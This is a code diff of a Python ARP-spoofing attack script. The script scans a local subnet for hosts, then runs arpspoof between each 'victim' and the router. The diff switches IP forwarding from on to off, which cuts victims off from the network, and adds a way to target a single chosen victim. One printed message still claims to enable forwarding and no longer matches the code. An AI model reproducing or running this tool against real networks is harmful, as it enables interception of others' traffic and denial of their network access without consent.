@@ -8,7 +8,7 @@ import nmap3
 
 interface = sys.argv[1]
 router_ip = sys.argv[2]
-victims = None
+victims = []
 
 
 def attack(ips):
@@ -16,11 +16,11 @@ def attack(ips):
 		os.system(f"xterm -e arpspoof -i {interface} -t {ip} {router_ip} &")
 		os.system(f"xterm -e arpspoof -i {interface} -t {router_ip} {ip} &")
 
-	os.system("xterm -e ping google.com")
+	os.system("xterm -e ping localhost")
 
 
-def init_forward():
-	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+def disable_ip_forward():
+	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 
 def scanner(ip):
@@ -53,10 +53,14 @@ def scanner(ip):
 
 if __name__ == "__main__":
 	print("Setting IP forward on your PC..")
-	init_forward()
+	disable_ip_forward()
 
-	print("Scanning computers in local network..")
-	scanner("192.168.1.0/24")
+	try:
+		victims.append(sys.argv[3])
+		print("The only victim exposed", sys.argv[3])
+	except:
+		print("Scanning computers in local network..")
+		scanner("192.168.1.0/24")
 
 	print("Running the attack..")
 	attack(victims)
